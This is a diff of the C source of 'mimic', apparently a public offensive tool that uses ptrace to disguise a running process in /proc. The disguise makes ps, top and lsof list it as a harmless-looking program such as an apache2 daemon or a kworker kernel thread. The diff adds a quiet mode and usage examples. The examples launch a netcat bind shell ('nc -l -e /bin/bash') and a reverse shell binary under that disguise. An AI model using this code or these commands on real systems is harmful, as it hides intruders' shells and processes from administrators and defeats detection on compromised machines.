@@ -2,33 +2,28 @@
 /***********************************************************************************************************************
  *
  *	mimic
+ *		Liar, liar, /proc on fire!
  *
  *
  *	emptymonkey's tool for covert execution. 
- *		Liar, liar, /proc on fire!
+ *		This tool runs in user-space and requires *no* elevated privileges. 
  *
  *
  *	2014-09-28
  *
  *
- *	This tool runs in user-space and requires *no* elevated privileges. 
- *
  *	This tool allows a user to run any program on the system and have it appear in the process listings as any other
- *	program. This is acheived by altering the internal process structures in a way that confuses the /proc
- *	filesystem. Tools that report process details back to the user (e.g. ps, top, lsof) gather thier information from
- *	the /proc filesystem.
+ *	program. This is acheived by altering the internal process structures in a way that confuses it's entry in the
+ *	 /proc filesystem. All tools that report process details back to the user (e.g. ps, top, lsof) gather their
+ *	information from the /proc filesystem.
  *
  *
  *	Features:
- *		* Mimic the desired process while maintaining proper internal consistency, ensuring the real process doesn't
- *				believe it's own deception.
+ *		* Mimics the desired process while maintaining a proper internal consistency.
+ *			This ensures that the real process isn't confused by it's own camouflage.
  *		* Alter /proc/PID/cmdline to report as the mimic cmdline would.
  *		* Alter /proc/PID/environ to report as the mimic envp would.
  *		* Alter /proc/PID/stat to report as the mimic stat would.
- *
- *	To Do:
- *		* Add /proc/PID/exe support (though this will likely only be usable as root.)
- *		* Add support for remapping the internal memory of the process so that /proc/PID/maps is of no help.
  *
  **********************************************************************************************************************/
 
@@ -52,11 +47,18 @@
 #include "libptrace_do.h"
 
 
+// These defaults are just processes that look reasonably innocent. Feel free to change them as you see fit.
+// Be creative!
 #define DEFAULT_MIMIC "/usr/sbin/apache2 -k start"
 #define DEFAULT_ROOT_MIMIC "[kworker/0:0]"
 
+
+// In one case, mimic will want to reset it's own state. This means it will call execve on itself. We will
+// use an SOH character in the argv array to mark that it is the second time through, and thus a different
+// execution case.
 #define SOH_CHAR	0x01
 #define NULL_CHAR	0x00
+
 
 
 char **wordexp_t_to_vector(wordexp_t *wordexp_t_in);
@@ -66,22 +68,45 @@ int get_vector_byte_count(char **argv);
 
 
 
+char *CALLING_CARD = "@emptymonkey - https://github.com/emptymonkey";
+
+
+
+/***********************************************************************************************************************
+ *
+ * usage()
+ *
+ *	Inputs:
+ *		None.
+ *
+ *	Outputs:
+ *		None.
+ *
+ *	Purpose:
+ *		Advise the user as to the error of their ways.
+ *
+ **********************************************************************************************************************/
 void usage(){
 
-	fprintf(stderr, "usage: %s -e COMMAND [-m MIMIC] [-b] [-a KEY=VALUE] [-h]\n", program_invocation_short_name);
+	fprintf(stderr, "\nusage: %s -e COMMAND [-m MIMIC] [-b] [-a KEY=VALUE] [-q] [-h]\n", program_invocation_short_name);
 	fprintf(stderr, "\t-e\tExecute COMMAND.\n");
 	fprintf(stderr, "\t-m\tSetup COMMAND to look like MIMIC.\n");
 	fprintf(stderr, "\t\t\tDefault for non-root is:\t\"%s\"\n", DEFAULT_MIMIC);
 	fprintf(stderr, "\t\t\tDefault for root is:\t\t\"%s\"\n", DEFAULT_ROOT_MIMIC);
 	fprintf(stderr, "\t-b\tLaunch COMMAND in the background.\n");
 	fprintf(stderr, "\t-a\tAdd / overwrite KEY to the mimic environment with associated VALUE.\n");
+	fprintf(stderr, "\t-q\tBe quiet! Do not print normal output.\n");
 	fprintf(stderr, "\t-h\tPrint this helpful message.\n");
 	fprintf(stderr, "\n\tNotes:\n");
 	fprintf(stderr, "\t\tThe MIMIC environment will be a copy of the COMMAND environment.\n");
 	fprintf(stderr, "\t\tThe '_' variable is automatically changed.\n");
 	fprintf(stderr, "\t\tThe -a flag can be called multiple times to add / overwrite multiple variables.\n");
-	// XXX Add examples.
 	fprintf(stderr, "\n\tExamples:\n");
+	fprintf(stderr, "\t\tmimic -e /bin/bash\n");
+	fprintf(stderr, "\t\tset_target_pid 1 && mimic -e /bin/bash\n");
+	fprintf(stderr, "\t\tmimic -b -e \"./revsh\"\n");
+	fprintf(stderr, "\t\tmimic -b -e \"nc -l -e /bin/bash\"\n");
+	fprintf(stderr, "\t\tmimic -b -e \"nc -l -e \\\"mimic -e /bin/bash\\\"\"\n\n");
 
 	exit(-1);
 }
@@ -92,13 +117,19 @@ void usage(){
  *
  *	main()
  *
- *	Input: Our instructions from the command line, as well as our environment.
- *	Output: An integer representing status.
+ *
+ *	Inputs:
+ *		Our instructions from the command line, as well as our environment.
+ *
+ *	Outputs:
+ *		An integer representing status.
+ *
  *
  *	Purpose: main() runs the show.
  *
- *	Strategy: This is a simple program. The heavy lifting is done using the ptrace_do library. That along with a 
- *		solid understanding of process internals leaves very little left for us to do here. The plan of attack is
+ *
+ *	Strategy: This is a simple program. The heavy lifting is done using the ptrace_do library. That, along with a 
+ *		solid understanding of process internals, leaves very little left for us to do here. The plan of attack is
  *		as follows:
  *			* Parse the relevant input from the user and do some initialization.
  *			* Fork a child process. (This child will be the exec() point, and is our willing accomplice.)
@@ -106,14 +137,18 @@ void usage(){
  *			* The parent will connect with the child and initialize its ptrace_do instance.
  *			* The parent will examine the child's state.
  *			* The parent will inject a prctl() PR_SET_NAME request for the child to execute.
- *			* The parent will execute the child, one step at a time, and inspect the child each at step, attempting
- *				to locate main().
+ *			* The parent will continue to execute the child, one step at a time, inspecting the child each at step.
+ *				It will continue until it is able to locate the child's main() function entry point.
  *			* As the child was executed with the mimic argv and envp, the deception was already set up by the kernel.
  *				We must now set up the child's internal state so it doesn't deceive itself.
- *			* The parent will request memory in the remote process.
- *			* The parent will set up that region of memory to hold the execution headers, as you would find at the base
- *				of the stack, consisting of argv, envp, and a NULL auxv.
+ *			* The parent will request a chunk of memory in the child.
+ *			* The parent will set up that region of memory to hold the execution headers, as you would normally find at
+ *				the base of the stack, consisting of argv, envp, and a NULL auxv.
  *			* The parent will set up some remaining state in the child and detach.
+ *			* In the case where the child needs to run in a foreground state, the parent will set up it's own deceptive
+ *				mimic argv and envp, then re-exec by calling execve() on itself. It's mimic argv will have a special
+ *				character (SOH) set up at at a precise point. This character will be interpreted upon re-execution as a
+ *				directive to wait() for child completion.
  *
  *	Good-bye and have a good-luck! :)
  *
@@ -164,7 +199,11 @@ int main(int argc, char **argv, char **envp){
 
 	char *mimic_short_name;
 
+	int quiet = 0;
 
+
+	// Before going forward, we need to figure out if this is the initial launch, or the re-exec we 
+	// called on ourselves.
 	if(argv){
 		i = 0;
 		while(argv[i]){
@@ -178,6 +217,7 @@ int main(int argc, char **argv, char **envp){
 		}
 	}
 
+	// If it's the re-exec, reset our name to the mimic name, and wait() for the child to complete.
 	if(self_exec){
 		memset(&argc, i, 1);	
 		i++;
@@ -198,22 +238,26 @@ int main(int argc, char **argv, char **envp){
 	}
 
 
+	// Onward to the normal case of initial execution!
 
-	// The max size needed of the new env buffer will be:
+
+	// The max size needed for the new env buffer will be:
 	//  * size of current env
 	//  * plus the size of the max '_' variable (which is PATH_MAX + 3)
 	//	* plus the strlen's of the various added environment variables.
+	//
+	// We probably won't need that much, but that should suffice for a max estimate.
 	tmp_size = get_vector_byte_count(envp);
 	tmp_size += PATH_MAX + 3;
 
+	// Step through the args once just to estimate the incoming size of the new environment variables.
 	opterr = 0;
-	while ((opt = getopt(argc, argv, "e:m:wa:bh")) != -1) {
+	while ((opt = getopt(argc, argv, "e:m:wa:bqh")) != -1) {
 		switch (opt) {
 			case 'a':
 				tmp_size += strlen(optarg) + 1;
 		}
 	}
-
 
 	if((mimic_envp = (char **) calloc(tmp_size, sizeof(char))) == NULL){
 		fprintf(stderr, "calloc(%d, %d): %s\n", tmp_size, (int) sizeof(char), strerror(errno));
@@ -221,10 +265,10 @@ int main(int argc, char **argv, char **envp){
 	}
 
 
-	// Now reset and actually handle the options.
+	// Now reset the getopt() loop and actually handle the options.
 	optind = 1;
 	opterr = 1;
-	while ((opt = getopt(argc, argv, "e:m:wa:bh")) != -1) {
+	while ((opt = getopt(argc, argv, "e:m:wa:bqh")) != -1) {
 
 		switch (opt) {
 			case 'e':
@@ -245,16 +289,22 @@ int main(int argc, char **argv, char **envp){
 				}
 				break;
 
+			case 'q':
+				quiet = 1;
+				break;
+
 			case 'h':
 			default:
 				usage();
 		}
 	}
 
-
 	if((argc - optind) || !execute_string){
 		usage();
 	}
+
+
+	// Do initialization of basic data structures for the given input.
 
 	if(!mimic_string){
 		if(!getuid()){
@@ -282,10 +332,10 @@ int main(int argc, char **argv, char **envp){
 	}
 	mimic_argc = mimic_wordexp_t.we_wordc;
 
-
+	// Grab the mimic short name, which is needed for proper reporting in /proc/PID/stat .
 	if((mimic_argv[0][0] == '[') && (mimic_argv[0][strlen(mimic_argv[0]) - 1] == ']')){
 		if((mimic_short_name = (char *) calloc(strlen(mimic_argv[0]) - 2 + 1, sizeof(char))) == NULL){
-			error(-1, errno, "calloc(%d, %d)", strlen(mimic_argv[0]) - 2 + 1, (int) sizeof(char));
+			error(-1, errno, "calloc(%d, %d)", (int) (strlen(mimic_argv[0]) - 2 + 1), (int) sizeof(char));
 		}
 		memcpy(mimic_short_name, mimic_argv[0] + 1, strlen(mimic_argv[0]) - 2);
 	}else{
@@ -296,6 +346,8 @@ int main(int argc, char **argv, char **envp){
 		}
 	}
 
+	// Fix the '_=' environment variable. There are probably others you should do manually,
+	// but we'll do this one automatically at least.
 	if(envp){
 		i = 0;
 		while(envp[i]){
@@ -315,33 +367,60 @@ int main(int argc, char **argv, char **envp){
 		}
 	}
 
+	// Fork off the child.
 
-	printf("Launching child...");
+	if(!quiet)
+		printf("Launching child...");
+
 	retval = fork();
 
 
 	if(retval == -1){
 		error(-1, errno, "fork()");
 
-	}else if(retval){
+	}else if(!retval){
 
-		// parent
+		// Child.
+
+		// Request to be attached.
+		if((retval = ptrace(PTRACE_TRACEME, 0, NULL, NULL)) == -1){
+			error(-1, errno, "ptrace(PTRACE_TRACEME, 0, NULL, NULL)");
+		}
+
+		// Go, go, go!
+		execve(execute_argv[0], mimic_argv, mimic_envp);
+		error(-1, errno, "execve(%s, %lx, NULL)", execute_argv[0], (unsigned long) mimic_argv);
+
+	}else{
+
+		// Parent
+		//	(Due to the verbose printf() statements, this section will be lightly commented.)
+
 		child_pid = retval;
+
+	if(!quiet)
 		printf("\t\t\tSuccess!\n");
 
+	if(!quiet)
 		printf("Waiting for child to attach...");
+
 		wait(NULL);
+
+	if(!quiet)
 		printf("\t\tSuccess!\n");
 
 
+	if(!quiet)
 		printf("Initializing ptrace_do...");
 		if((child = ptrace_do_init(child_pid)) == NULL){
 			fprintf(stderr, "ptrace_do_init(%d): %s\n", child_pid, strerror(errno));
 			exit(-1);
 		}
+	if(!quiet)
 		printf("\t\tSuccess!\n");
 
 
+	if(!quiet)
 		printf("Determining stack state...");
 		errno = 0;
 		peektext = ptrace(PTRACE_PEEKTEXT, child->pid, child->saved_regs.rsp, NULL);
@@ -355,14 +434,15 @@ int main(int argc, char **argv, char **envp){
 		argv_stack_val = child->saved_regs.rsp + 0x8;
 		envp_stack_val = argv_stack_val + ((argc_stack_val + 1) * 0x8);
 
+	if(!quiet)
 		printf("\t\tSuccess!\n");
 
 
+	if(!quiet)
 		printf("Politely requesting name change...");
-
 		if((local_buffer = ptrace_do_malloc(child, strlen(mimic_short_name) + 1)) == NULL){
 			fprintf(stderr, "ptrace_do_malloc(%lx, %d): %s\n", \
-					(unsigned long) child, strlen(mimic_short_name) + 1, \
+					(unsigned long) child, (int) (strlen(mimic_short_name) + 1), \
 					strerror(errno));
 			goto CLEAN_UP;
 		}
@@ -391,15 +471,28 @@ int main(int argc, char **argv, char **envp){
 					strerror(-ret_long));
 			goto CLEAN_UP;
 		}
+	if(!quiet)
 		printf("\tSuccess!\n");
 
 
+	if(!quiet)
 		printf("Searching for main()...");
 		memcpy(&test_regs, &(child->saved_regs), sizeof(struct user_regs_struct));
 
-		while(!((test_regs.rdi == argc_stack_val) && (test_regs.rsi == argv_stack_val) && (test_regs.rdx == envp_stack_val) && \
-					(test_regs.rip > child->map_head->start_address) && (test_regs.rip <  child->map_head->end_address) && \
-					(test_regs.rbp == 0) && (test_regs.rcx == 0) && (test_regs.rbx == 0))){
+		// This while loop test represents the state of the registers upon entry into the main() function 
+		// after a proper libc initialization. This is the heuristic we will use to determine if we are in
+		// the proper place to work our mimic magic! 
+		while( ! \
+				( \
+					(test_regs.rdi == argc_stack_val) && \
+					(test_regs.rsi == argv_stack_val) && \
+					(test_regs.rdx == envp_stack_val) && \
+					(test_regs.rip > child->map_head->start_address) && \
+					(test_regs.rip <  child->map_head->end_address) && \
+					(test_regs.rbp == 0) && \
+					(test_regs.rcx == 0) && \
+					(test_regs.rbx == 0) \
+				)){
 
 			if((ret_long = ptrace(PTRACE_SINGLESTEP, child->pid, NULL, NULL)) == -1){
 				fprintf(stderr, "ptrace(PTRACE_SINGLESTEP, %d, NULL, NULL): %s\n", \
@@ -427,9 +520,16 @@ int main(int argc, char **argv, char **envp){
 			fprintf(stderr, "Error: libc register setup not detected. Aborting!\n");
 			goto CLEAN_UP;
 		}
+	if(!quiet)
 		printf("\t\t\tSuccess!\n");
 
 
+		// We use the term "execution headers" to refer to the solid chunk of memory that contains
+		// argc, argv, envp, and auxv.
+		// Once it has been set up, the pointers inside will be consistantly self-referential, for
+		// the address space of the child process. That will allow us to simply push the memory 
+		// chunk over and detatch.
+	if(!quiet)
 		printf("Building execution headers...");
 		memcpy(&(child->saved_regs), &test_regs, sizeof(struct user_regs_struct));
 
@@ -462,25 +562,34 @@ int main(int argc, char **argv, char **envp){
 		}
 
 		ptrace_do_free(child, execution_header_local, FREE_LOCAL);
+	if(!quiet)
 		printf("\t\tSuccess!\n");
 
 
-		printf("Setting up state...");
+	if(!quiet)
+		printf("Setting up final state...");
 		child->saved_regs.rdi = execute_argc;
 		child->saved_regs.rsi = (unsigned long) execution_header_remote;
 		child->saved_regs.rdx = (unsigned long) execution_header_remote + ((execute_argc + 1) * sizeof(char **));
-		printf("\t\t\tSuccess!\n");
+	if(!quiet)
+		printf("\t\tSuccess!\n");
 
+	if(!quiet)
 		printf("\n\tGood-bye and have a good luck! :)\n\n");
+
 
 CLEAN_UP:
 		ptrace_do_cleanup(child);
 
+
+		// Handle the case where we need to hang around and reserve the foreground slot for the child.
 		if(!background){
 
 			soh_string[0] = SOH_CHAR;
 			soh_string[1] = NULL_CHAR;
 
+			// mimic_argc + slot for the SOH string + slot for the mimic short name string + slot for NULL termination
+			//  -> mimic_argc + 3
 			if((foreground_mimic_argv = (char **) calloc(mimic_argc + 3, sizeof(char **))) == NULL){
 				fprintf(stderr, "calloc(%d, %d): %s\n", \
 						tmp_size, (int) sizeof(char), strerror(errno));
@@ -499,16 +608,6 @@ CLEAN_UP:
 		}
 
 		return(0);
-
-	}else{
-
-		//child
-		if((retval = ptrace(PTRACE_TRACEME, 0, NULL, NULL)) == -1){
-			error(-1, errno, "ptrace(PTRACE_TRACEME, 0, NULL, NULL)");
-		}
-
-		execve(execute_argv[0], mimic_argv, mimic_envp);
-		error(-1, errno, "execve(%s, %lx, NULL)", execute_argv[0], (unsigned long) mimic_argv);
 	}
 
 	return(-1);
@@ -516,6 +615,21 @@ CLEAN_UP:
 
 
 
+/***********************************************************************************************************************
+ *
+ *	key_match()
+ *
+ *		Inputs:
+ *			A vector of ENV style strings.
+ *			A key value to search for.
+ *
+ *		Outputs:
+ *			An int representing success or failure.
+ *
+ *		Purpose:
+ *			Tell the caller whether or not the key has a match in the vector.
+ *
+ **********************************************************************************************************************/
 int key_match(char **vector, char *key_value){
 
 	int i;
@@ -538,6 +652,23 @@ int key_match(char **vector, char *key_value){
 
 
 
+/***********************************************************************************************************************
+ *
+ *	build_execution_headers()
+ *
+ *		Inputs:
+ *			A buffer to store results in.
+ *			The base address the remote memory chunk will have.
+ *			argv and envp
+ *
+ *		Outputs:
+ *			None.
+ *
+ *		Purpose:
+ *			Builds the execution headers. Given that this is only called once, I don't suppose it needs to be a function,
+ *			but moving it here keeps the above flow a bit cleaner.
+ *
+ **********************************************************************************************************************/
 void build_execution_headers(void *local_buffer, void *base_addr, char **argv, char **envp){
 
 	int i;
@@ -596,6 +727,20 @@ void build_execution_headers(void *local_buffer, void *base_addr, char **argv, c
 
 
 
+/***********************************************************************************************************************
+ *
+ *	get_vector_byte_count()
+ *
+ *		Inputs:
+ *			A pointer to a vector.
+ *
+ *		Outputs:
+ *			The number of bytes used by the vector.
+ *
+ *		Purpose:
+ *			Find the amount of bytes in use by a vector.
+ *
+ **********************************************************************************************************************/
 int get_vector_byte_count(char **argv){
 
 	int i = 0;
@@ -608,5 +753,3 @@ int get_vector_byte_count(char **argv){
 
 	return( ((i + 1) * sizeof(void *)) + total_strlen + (i * sizeof(char)) );
 }
-
-
